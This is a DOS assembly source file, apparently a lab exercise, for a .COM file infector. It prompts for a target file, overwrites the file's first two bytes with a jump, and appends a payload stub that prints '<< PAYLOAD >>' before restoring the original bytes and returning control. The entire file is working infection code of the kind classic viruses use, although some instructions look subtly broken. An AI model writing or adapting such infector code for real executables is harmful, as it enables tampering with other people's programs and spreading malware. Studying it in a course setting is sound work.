.model tiny
.code
org 100h
start:

    ; print input request
    lea dx, input_msg
    mov ah, 09h
    int 21h

    ; buffered input
    lea dx, filename
    mov ah, 0ah
    int 21h

    ; console endl
    mov dl, 10
    mov ah, 02h
    int 21h

    ; preparing filename
    lea bx, filename.text
    push bx
    mov al, filename.len
    mov ah, 00h
    add bx, ax
    mov byte ptr[bx], 0

    ; setting dta on file
    mov ah, 1ah
    lea dx, file
    int 21h

    ; finding victim file
    pop dx ; get filename.text address from stack
    mov ah, 4eh
    int 21h

    ; opening file (file descriptor -> ax)
    lea dx, file.name
    mov ax, 3D02h
    int 21h

    ; file error handling
    jnc file_err_skip
    lea dx, file_err_msg
    mov ah, 09h
    int 21h
    mov ah, 4ch
    int 21h

file_err_skip:

    ; moving carret to the end to get the payload offset
    mov cx, 0
    mov dx, 0
    mov bx, ax ; file descriptor (ax) -> bx
    mov ax, 4202h
    int 21h
    mov payload_offset, al

    ; preparing payload addressation
    mov payload_map[0], payload_offset - offset payload_code + offset leading_bytes + 7
    mov payload_map[1], payload_offset - offset payload_code + offset pld_str + 7
    mov payload_map[2], payload_offset - offset payload_code + offset test_word + 7
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; reading first 2 bytes:
    mov cx, 2
    lea dx, leading_bytes
    mov ah, 3fh
    int 21h
    
    ; moving carret to the start
    mov cx, 0
    mov dx, 0
    mov ax, 4200h
    int 21h

    ; inserting load injection
    mov al, 0ebh ; jmp code
    mov ah, payload_offset ; jmp offset
    sub ah, 2 ; jmp command size
    mov word_buffer, ax
    lea dx, word_buffer
    mov cx, 2
    mov ah, 40h
    int 21h
    
    ; moving carret to the end
    mov cx, 0
    mov dx, 0
    mov ax, 4202h
    int 21h

    ; writing payload pre_code
    lea dx, b5_buffer
    mov cx, 5
    mov ah, 40h
    int 21h
    
    mov al, payload_offset
    mov ah, 0
    add ax, offset payload_data - offset payload_code + 107h
    mov word_buffer, ax
    lea dx, word_buffer
    mov cx, 2
    mov ah, 40h
    int 21h

    ; writing payload code
    lea dx, payload_code
    lea cx, payload_data
    sub cx, offset payload_code
    mov ah, 40h
    int 21h

    ; writing payload data
    lea dx, payload_data
    lea cx, data
    sub cx, offset payload_data
    mov ah, 40h
    int 21h

    ; closing file
    mov ah, 3eh
    int 21h
    ret

    mov ah, 4ch
    int 21h

payload_code:

    mov bx, cs:[100h]

    mov ax, [bx][2h]

    lea dx, [bx][1]
    mov ah, 09h
    int 21h

    mov ax, [bx][0]
    mov bx, 100h
    mov word ptr[bx], ax

    mov ax, 100h
    jmp ax

payload_data:

    payload_map dw 3 dup(?)
    leading_bytes dw 0ffffh ; #0
    pld_str db '<< PAYLOAD >>', 13, 10, '$' ; #1
    test_word dw 1234h

data:
    
    ; 13-byte string for filename
    Str13 struc
    max db 13
    len db ?
    text db 13 dup(?)
    Str13 ends

    ; DTA buffer structure
    DTAFileInfo struc
    reserved db 21 dup(?)
    attr db ?
    time dw ?
    date dw ?
    size dd ?
    name db 13 dup(?)
    ends

    filename Str13 <>
    file DTAFileInfo <>

    b5_buffer db 2eh, 0c7h, 6, 0, 1 
    payload_data_local_addr dw ?
    word_buffer dw ?
    byte_buffer db ?
    payload_offset db ?
    file_mask db 'lab3v.com', 0
    file_err_msg db 'Error, can not find or open such file.', 13, 10, '$'
    input_msg db 'Input the target filename >> ','$'

afterall:

end start